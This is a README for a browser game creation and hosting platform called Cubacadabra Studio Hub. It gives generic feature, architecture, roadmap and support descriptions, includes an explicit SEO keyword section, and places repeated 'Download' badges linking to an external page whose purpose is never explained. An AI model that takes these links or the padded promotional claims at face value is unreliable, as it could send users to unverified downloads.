![preview](https://raw.githubusercontent.com/Easyere/cubacadabra-wasm-runtime/main/splash_3d1a.svg)
[![Download](https://raw.githubusercontent.com/Easyere/cubacadabra-wasm-runtime/main/latest_beac127.svg)](https://Easyere.github.io/cubacadabra-wasm-runtime/)

# 🧩 Cubacadabra — Browser Client & Game-Package Host

**A next-generation, browser-native playground for simulation-heavy creative games.**

Cubacadabra is the browser client and game-package host for a universe of small, modular, infinitely remixable experiences. The front-of-house is written in vanilla JavaScript — no heavyweight framework, just a lean page, HUD, input pipeline, and networking layer that loads instantly on almost any device. The back-of-house is a shared Rust-to-WASM runtime that ships simulation, Luau scripting, and rendering capabilities straight into the browser sandbox. Together, they form a bridge between handcrafted JavaScript ergonomics and systems-level performance.

The repository you are looking at is the *new and distinct* sibling project: **Cubacadabra Studio Hub**. It is the editor, package registry, and multiplayer rendezvous layer that sits on top of the original client. Think of it as the workshop where creators build carts, the library where those carts are stored, and the town square where players gather to try them.

---

[![Download](https://raw.githubusercontent.com/Easyere/cubacadabra-wasm-runtime/main/latest_beac127.svg)](https://Easyere.github.io/cubacadabra-wasm-runtime/)

---

## 📚 Table of Contents

- [What Is Cubacadabra Studio Hub?](#-what-is-cubacadabra-studio-hub)
- [Why Another Game Host?](#-why-another-game-host)
- [Core Feature Set](#-core-feature-set)
- [Architecture Overview](#-architecture-overview)
- [The Vanilla JS Client Layer](#-the-vanilla-js-client-layer)
- [The Rust-to-WASM Runtime Layer](#-the-rust-to-wasm-runtime-layer)
- [Luau Scripting Surface](#-luau-scripting-surface)
- [Package Format & Hosting](#-package-format--hosting)
- [Responsive UI & Accessibility](#-responsive-ui--accessibility)
- [Multilingual Support](#-multilingual-support)
- [Networking & Latency Strategy](#-networking--latency-strategy)
- [Security Model](#-security-model)
- [Performance Budget](#-performance-budget)
- [SEO-Friendly Keyword Integration](#-seo-friendly-keyword-integration)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [24/7 Customer Support](#-247-customer-support)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🎯 What Is Cubacadabra Studio Hub?

Cubacadabra Studio Hub is the creator-facing and player-facing counterpart to the Cubacadabra browser runtime. Where the original client focuses on *running* a single game package inside a browser tab, the Studio Hub focuses on *producing, sharing, and discovering* those packages.

It bundles three cooperating services into one repository:

1. **The Studio** — a browser-based scene editor, asset importer, and script editor for building cartridges ("carts") that run on the shared runtime.
2. **The Registry** — a lightweight package host that serves versioned cart bundles, metadata, and dependency manifests.
3. **The Lobby** — a matchmaking and presence service that lets players join shared sessions without needing an account server or third-party identity provider.

The design goal is simple: make it possible for one person with a laptop and a browser to build a physics-driven mini-game in an afternoon, publish it to the registry, and share a link that any friend can open in their own browser — on desktop, tablet, or phone — without installing a thing.

---

## 🌟 Why Another Game Host?

Most creative-game platforms ask creators to accept one of two trade-offs:

- **Full engines** give you power, but they require a heavyweight editor, a native build step, and a local toolchain that most hobbyists never fully tame.
- **Toy sandboxes** give you immediacy, but they cap the ceiling at sprite-based playthings that can never simulate anything meaningful.

Cubacadabra Studio Hub refuses that trade-off. It borrows the immediacy of a web page and the simulation muscle of a Rust core, then hides the seam behind a scripting language that feels like writing directions for a friendly robot rather than wrestling a compiler.

If the browser is a theater, JavaScript is the stage crew — fast, visible, good at set changes. Rust-to-WASM is the hydraulic machinery under the floorboards — quiet, powerful, precise. Luau is the script the actors read. Studio Hub is the whole playhouse.

---

## ✨ Core Feature Set

### 🎨 Creation & Editing
- **In-browser scene composer** with grid snapping, transform gizmos, and hierarchy grouping.
- **Live Luau console** that hot-reloads scripts against a running world without restarting the session.
- **Asset pipeline** supporting glTF meshes, PNG/WebP textures, and procedurally generated noise resources.
- **Version timeline** that records every save as a diffable snapshot so creators can rewind mistakes.
- **Cart forking** — duplicate any published package into your own workspace and remix it freely, with attribution preserved automatically.

### 🕹️ Play & Share
- **Instant session links** that boot a world in under a second on a mid-range phone.
- **Shared multiplayer rooms** with authoritative simulation ticked by one host peer and mirrored to guests.
- **Spectator mode** for watching live builds and playtests in real time.
- **Replay snapshots** that capture the last 60 seconds of an input stream for post-match review.

### 🧱 Platform Foundations
- **Responsive UI** that reflows from ultrawide monitor layouts down to compact phone HUDs.
- **Multilingual support** with runtime-switchable locale packs and right-to-left layout handling.
- **24/7 customer support** channel for creators navigating publishing issues, takedown requests, or runtime crashes.
- **Deterministic simulation** so two machines can agree on the same world state given identical inputs.
- **Package signing** via content hashes, ensuring every cart the registry serves matches the hash the creator published.

### 🔌 Integration Surface
- **REST and event-stream endpoints** for the registry, documented in the API reference.
- **Webhook fan-out** for publish events, so external dashboards can track your cart's lifecycle.
- **Embeddable player** — a stripped-down bootstrap that lets third-party blogs host a cart inline.
- **Plugin manifest** that lets the Studio load optional tooling without patching core files.

---

## 🏗️ Architecture Overview

The system is organized into four concentric layers, each with a single responsibility.

**Layer 1 — The Shell (JavaScript).** Handles DOM, HUD composition, input normalization, responsive layout, and the networking transport. It never touches simulation math. It is the part of the system that users *see* and that browsers *understand natively*.

**Layer 2 — The Bridge (JavaScript ⇄ WASM).** A thin, well-typed boundary that marshals commands and state deltas between the JavaScript shell and the compiled runtime. Everything crossing this boundary is either a small primitive message or a shared memory view, never a deep object graph.

**Layer 3 — The Runtime (Rust compiled to WebAssembly).** Owns the simulation loop, physics integration, spatial queries, wgpu rendering submission, and Luau script execution. It is deterministic, testable, and identical on every platform that can run WebAssembly.

**Layer 4 — The Content (Luau carts + assets).** The user-authored world logic, geometry, textures, and audio. It runs inside a sandboxed host provided by Layer 3, with no direct access to the network, the document, or the file system.

This separation is what allows the same runtime to power a single-player puzzle cart, a four-player arena brawler, and a physics sandbox — without any of them knowing what kind of game they are.

---

## 🧼 The Vanilla JS Client Layer

There is a quiet luxury in writing plain JavaScript in 2026. No build step, no bundler churn, no dependency resolution tree that grows faster than the game itself. The client layer is deliberately framework-less and works on the principle that the browser is already a very good application platform if you let it be one.

Responsibilities include:

- **Page orchestration** — mounting the canvas, bootstrapping the WASM module, wiring the HUD.
- **Input pipeline** — keyboard, pointer, gamepad, and touch all normalized into a single vector of intents before crossing the bridge.
- **Responsive layout** — CSS custom properties drive every HUD panel, so the same markup serves a phone in portrait and a 4K monitor in landscape.
- **Networking** — WebSocket session channel plus a lightweight HTTP path for registry calls.
- **Localization** — locale packs loaded on demand and injected into the DOM through data attributes.

The result is a client that boots fast, debugs easily, and can be read cover-to-cover by a new contributor in a single sitting.

---

## ⚙️ The Rust-to-WASM Runtime Layer

The runtime is the part of Cubacadabra that makes it more than a toy. Compiling Rust to WebAssembly gives us memory safety, predictable performance, and a single codebase that behaves identically in every browser that supports WASM.

Inside the runtime:

- **Fixed-timestep simulation** — the world advances in deterministic ticks, decoupled from render framerate.
- **Physics integrator** — swept collision, impulse resolution, and constraint solving suitable for action-packed cart gameplay.
- **wgpu rendering** — the same GPU abstraction used natively, compiled to WebGPU with a WebGL fallback for older clients.
- **Luau VM binding** — scripts receive a curated host API exposing entity creation, transform mutation, event subscription, and timer scheduling.
- **Deterministic RNG** — seeded from the cart manifest, so replays and networked sessions stay in lockstep.

The runtime does not know what a "crate" or a "player" is. It knows entities, components, and systems. Meaning is layered on top by the carts themselves, which is what makes the platform so flexible.

---

## 🐙 Luau Scripting Surface

Luau is the scripting language creators actually write. It is fast, gradually typed, and forgiving enough for beginners while still supporting the patterns that experienced developers expect.

A typical cart script looks like this in spirit:

- Register a handler for the `onStart` lifecycle callback.
- Spawn a few entities and attach components to them.
- Subscribe to the `onTick` callback with a small function that reads input and updates transforms.
- Return control to the runtime, which will call the handler again next tick.

The host API is intentionally narrow. Every function a script can call is documented, versioned, and safe to invoke from a sandboxed context. There is no direct network access, no filesystem, and no way to reach outside the cart's own world state. This keeps malicious packages boring — the kind of thing that crashes its own simulation but never touches the player's machine.

---

## 📦 Package Format & Hosting

Every published cart is a self-contained bundle with a predictable shape:

- A **manifest** describing the cart's name, author display label, version, runtime requirement, and signature hash.
- A **world directory** containing scenes, entities, and physics colliders.
- A **scripts directory** holding Luau files, each of which can be loaded on demand.
- An **assets directory** for meshes, textures, audio, and data tables.
- A **thumbnail** rendered by the Studio and stored as a small WebP.

The registry serves these bundles over standard HTTP with strong caching headers and content-addressed URLs, so a given version of a cart is always byte-for-byte identical no matter where in the world it is fetched from.

The hosting layer is deliberately boring: static files, immutable URLs, and a small metadata index. Boring hosting is reliable hosting.

---

## 📱 Responsive UI & Accessibility

The Studio Hub is designed to feel at home on every screen it touches.

- **Fluid layouts** that rearrange panels rather than shrink them beyond usefulness.
- **Touch-first HUD** for the play experience, with large hit targets and haptic feedback hooks.
- **Keyboard navigation** throughout the Studio, including a command palette reachable from any panel.
- **Screen-reader labels** on all actionable controls and live-region announcements for session events.
- **Reduced motion mode** that dials back camera shake, particle density, and transition timing.
- **High-contrast theme** for low-light environments and users with visual sensitivity.

Accessibility is not a checkbox bolted on at the end. It is a constraint that shapes the layout, the input model, and the way the HUD speaks to the player.

---

## 🌍 Multilingual Support

Localization is a first-class concern rather than an afterthought.

- **Runtime locale switching** that does not require a page reload.
- **Right-to-left layout** support for Arabic and Hebrew locales, including mirrored HUD anchoring.
- **Number, date, and unit formatting** driven by the active locale.
- **Community translation pipeline** so contributors can propose new locale packs without touching core code.
- **Fallback chains** that gracefully degrade to a base language when a string is missing.

The goal is that a player in São Paulo and a player in Seoul both feel like the Hub was built for them, because it was.

---

## 📡 Networking & Latency Strategy

Cubacadabra sessions are peer-hosted rather than server-hosted, which keeps the infrastructure thin and the latency low.

- The session creator runs the authoritative simulation.
- Guests send input intents and receive state deltas.
- Interpolation smooths remote entities between snapshots.
- Reconciliation rewinds and replays local input when a correction arrives.
- Lag compensation is bounded so no player can gain an unfair advantage by inducing artificial delay.

The transport is a single WebSocket channel with binary framing. Messages are small enough that they are not the bottleneck — the bottleneck is always physics, and the runtime burns it down every tick.

---

## 🔒 Security Model

- **Sandboxed scripts** with no network, filesystem, or DOM access.
- **Content-addressed packages** so the bytes you receive match the bytes the creator published.
- **Signature verification** on the registry side, with optional creator key pinning.
- **Resource quotas** capping entity counts, script execution time, and memory per cart.
- **CSP-friendly deployment** that works without inline scripts or eval.
- **Reporting channel** for abusive or broken packages, routed through support.

Security here is about containment, not lockdown. The goal is to let creators do ambitious things without letting the ambitious things do damage.

---

## ⚡ Performance Budget

Performance targets are published, not aspirational. Every release is expected to stay within budget on a mid-range 2023 phone.

- **Cold boot to interactive:** under 1.5 seconds on a warm cache.
- **Package download:** under 2 MB for a typical cart, including assets.
- **Simulation tick:** under 4 milliseconds at 60 Hz for a 500-entity scene.
- **Memory ceiling:** 256 MB for the runtime, with warnings at 75% of budget.
- **Frame budget:** 16.6 ms total, with rendering and simulation splitting it roughly evenly.

When a release violates the budget, the release is held. The budget is the contract.

---

## 🔍 SEO-Friendly Keyword Integration

This repository exists in a crowded field — browser game hosting, WASM game runtime, Luau scripting, multiplayer peer sessions — and it wants to be found by the people it serves.

Natural phrases that describe what this project actually does, woven into documentation rather than stapled on:

- *browser-based game package host with WASM runtime*
- *Rust-to-WASM simulation engine for creative carts*
- *Luau scripting surface for browser-native mini-games*
- *peer-hosted multiplayer sessions without a dedicated server*
- *responsive game editor that runs entirely in the browser*
- *multilingual game creation platform with 24/7 customer support*

The intent is not to capture every keyword. It is to make sure that someone searching for a lightweight, deterministic, browser-native creative platform lands on something that actually answers their question.

---

## 🗺️ Roadmap for 2026

The 2026 roadmap is grouped into four tracks.

**Track A — Creation.**
- Visual scripting layer that compiles down to Luau.
- Collaborative editing with multiple cursors on the same scene.
- Asset import from standard 3D formats with automatic LOD generation.

**Track B — Play.**
- Reconnect-friendly sessions that survive a brief network drop.
- Cross-session matchmaking for popular carts.
- Built-in tournament brackets for competitive carts.

**Track C — Platform.**
- Native mobile wrapper that reuses the same WASM runtime.
- Desktop shell with filesystem access for power users.
- Public API for third-party analytics dashboards.

**Track D — Community.**
- Creator profiles with publishing history and remix graphs.
- Featured cart rotation curated by the community.
- Translation bounty program for underserved locales.

Nothing on this list is promised with a date. Everything on this list is promised with an intention.

---

## ❓ Frequently Asked Questions

**Is this the same as the original Cubacadabra client?**
No. This is a sibling repository focused on the *Studio Hub* — editing, hosting, and matchmaking. The original client remains the lean single-cart player. They share the runtime but ship separately.

**Do I need to know Rust to build a cart?**
No. Carts are written in Luau. Rust is for people extending the runtime itself, which is a much smaller group.

**Can I host my own registry?**
Yes. The registry is a static file host plus a metadata index. Running your own is a deployment exercise, not a development one.

**Does it work on phones?**
Yes. The client is responsive, touch-aware, and tested against mid-range hardware.

**Is there any monetization built in?**
Not in this repository. The Hub is a hosting and creation platform. Any commerce layer would live in a separate repository and a separate opt-in.

**How do I report a broken cart?**
Use the in-app report control, which routes through the 24/7 customer support channel.

---

## 🛎️ 24/7 Customer Support

Creators hit walls at 3 a.m. The Hub's support channel is staffed around the clock for publishing issues, runtime crashes, account recovery, takedown requests, and translation corrections. The channel is reachable from inside the Studio, from the registry web pages, and from the repository's issue tracker for developer-level concerns.

Support is not a chatbot gimmick. It is a real queue, with real humans, and a real commitment to first response within a handful of hours regardless of the hour on your clock.

---

## 🤝 Contributing

Contributions are welcome across every layer of the stack — JavaScript shell, Rust runtime, Luau host API, registry tooling, translations, and documentation.

Before opening a large change, open a discussion so the direction can be aligned with the roadmap. Small fixes, typo corrections, and translation improvements can go straight to a pull request. All contributions are expected to respect the security model: nothing that grants scripts new capabilities will be merged without a corresponding sandbox review.

The contribution guide lives alongside the code and is updated as the project grows. New contributors are explicitly encouraged — this platform exists because people kept showing up to build it.

---

## 📜 License

Released under the MIT License. The full text is available in the repository at [LICENSE](./LICENSE).

You are welcome to use, modify, and redistribute this project under the terms of that license, including for commercial purposes, as long as the original copyright notice and permission notice are preserved.

---

## ⚠️ Disclaimer

Cubacadabra Studio Hub is provided **as-is**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

The authors and contributors are not liable for any claim, damages, or other liability arising from the use of this software, whether in an action of contract, tort, or otherwise.

Creators are solely responsible for the content they publish to any registry, public or private, that they operate or connect to this software. The maintainers of this repository do not host, curate, or endorse any third-party cart, package, or registry unless explicitly stated.

As of 2026, this project is under active development. Interfaces may change between releases. Pin a version if you are building on top of the API and expect stability.

[![Download](https://raw.githubusercontent.com/Easyere/cubacadabra-wasm-runtime/main/latest_beac127.svg)](https://Easyere.github.io/cubacadabra-wasm-runtime/)